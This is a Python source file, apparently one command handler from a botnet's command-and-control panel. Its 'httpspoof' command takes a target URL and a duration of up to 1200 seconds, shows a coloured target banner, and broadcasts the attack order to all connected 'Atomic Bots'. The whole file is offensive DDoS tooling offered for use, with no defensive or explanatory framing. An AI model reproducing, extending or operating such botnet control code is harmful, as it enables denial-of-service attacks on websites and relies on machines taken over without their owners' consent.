from colorama import Fore

def httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 3:
        url = args[1]
        secs = args[2]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTWHITE_EX, Fore.GREEN, Fore.LIGHTWHITE_EX, Fore.CYAN, Fore.YELLOW, url, Fore.CYAN, Fore.YELLOW, secs, Fore.CYAN, Fore.YELLOW, 'HTTP SPOOF')

        if validate_time(secs):
            for x in xxxx.split('\n'):
                send(client, '\x1b[3;31m'+ x)
            send(client, f" {Fore.LIGHTWHITE_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTWHITE_EX} sent to all Atomic Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.YELLOW}.httpspoof [URL] [TIME]\n')
